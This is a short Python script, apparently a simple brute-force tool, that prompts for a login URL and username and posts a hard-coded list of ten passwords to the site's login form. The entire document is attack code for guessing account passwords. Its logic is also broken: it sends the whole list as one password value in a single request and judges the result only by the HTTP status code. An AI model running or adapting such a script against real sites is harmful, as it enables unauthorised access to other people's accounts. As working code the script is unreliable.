import requests

url = input("Enter URL: ")
username = input("What is the username you wish to attempt? ")
passlist = ["^cH%seY9VP*%f7$k", "ueg+tja(Ush46fJ%", 
"sMcr3tseGnRR3TEf", "K3ffTykBM^yM#yuS", 
"86fKb8zB9HBA*RxX", "HEKFkUbyw4S3h2ug", 
"zh@RQ8Nj69##(@+e", "9YpRkh@vEb6tTRJc", 
"bABAGW+CgXc!h9mt", "&f@Ty7Su(SHmsRqj" ]

data = {'username':username, 'password':passlist, "Login":'submit'}

send_data = requests.post(url, data=data)

print(send_data.status_code)

